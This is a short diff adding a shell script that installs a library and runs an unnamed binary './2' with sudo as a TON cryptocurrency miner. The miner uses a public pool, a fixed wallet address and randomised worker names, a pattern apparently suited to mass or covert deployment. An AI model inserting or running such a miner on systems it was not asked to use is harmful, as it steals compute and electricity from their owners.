@@ -1,0 +1,4 @@
+WORKER=$(echo $(shuf -i 1-99999 -n 1)-azklol)
+sudo apt-get update
+sudo apt-get install libpci3
+sudo ./2 --algo TON --pool https://pool.services.tonwhales.com --user EQAHyghNdUg4UWBbZgut-jjrqh0CjiWBONSSEe9V8s-aHjkl.$WORKER
